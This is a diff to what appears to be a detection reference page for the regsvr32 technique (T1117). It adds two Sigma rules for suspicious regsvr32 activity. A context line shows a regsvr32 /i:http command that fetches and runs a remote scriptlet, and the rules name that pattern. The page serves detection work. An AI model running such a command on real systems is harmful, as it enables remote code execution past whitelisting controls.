@@ -138,7 +138,55 @@ CommandLine: regsvr32 / s / n / u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.s
 ## Potential Detections
 
 ```json
-
+[{'data_source': {'author': 'Florian Roth',
+                  'date': '2019/10/02',
+                  'description': 'Detects a suspicious DLL loading from '
+                                 'AppData Local path as described in '
+                                 'BlueMashroom report',
+                  'detection': {'condition': 'selection',
+                                'selection': {'CommandLine': ['*\\regsvr32*\\AppData\\Local\\\\*',
+                                                              '*\\AppData\\Local\\\\*,DllEntry*']}},
+                  'falsepositives': ['Unlikely'],
+                  'id': 'bd70d3f8-e60e-4d25-89f0-0b5a9cff20e0',
+                  'level': 'critical',
+                  'logsource': {'category': 'process_creation',
+                                'product': 'windows'},
+                  'references': ['https://www.virusbulletin.com/conference/vb2019/abstracts/apt-cases-exploiting-vulnerabilities-region-specific-software'],
+                  'status': 'experimental',
+                  'tags': ['attack.defense_evasion', 'attack.t1117'],
+                  'title': 'BlueMashroom DLL Load'}},
+ {'data_source': {'author': 'Florian Roth',
+                  'description': 'Detects various anomalies in relation to '
+                                 'regsvr32.exe',
+                  'detection': {'condition': '1 of them',
+                                'selection1': {'CommandLine': '*\\Temp\\\\*',
+                                               'Image': '*\\regsvr32.exe'},
+                                'selection2': {'Image': '*\\regsvr32.exe',
+                                               'ParentImage': '*\\powershell.exe'},
+                                'selection3': {'CommandLine': ['*/i:http* '
+                                                               'scrobj.dll',
+                                                               '*/i:ftp* '
+                                                               'scrobj.dll'],
+                                               'Image': '*\\regsvr32.exe'},
+                                'selection4': {'Image': '*\\wscript.exe',
+                                               'ParentImage': '*\\regsvr32.exe'},
+                                'selection5': {'CommandLine': '*..\\..\\..\\Windows\\System32\\regsvr32.exe '
+                                                              '*',
+                                               'Image': '*\\EXCEL.EXE'}},
+                  'falsepositives': ['Unknown'],
+                  'fields': ['CommandLine', 'ParentCommandLine'],
+                  'id': '8e2b24c9-4add-46a0-b4bb-0057b4e6187d',
+                  'level': 'high',
+                  'logsource': {'category': 'process_creation',
+                                'product': 'windows'},
+                  'references': ['https://subt0x10.blogspot.de/2017/04/bypass-application-whitelisting-script.html'],
+                  'status': 'experimental',
+                  'tags': ['attack.t1117',
+                           'attack.defense_evasion',
+                           'attack.execution',
+                           'car.2019-04-002',
+                           'car.2019-04-003'],
+                  'title': 'Regsvr32 Anomaly'}}]
 ```
 
 ## Potential Queries
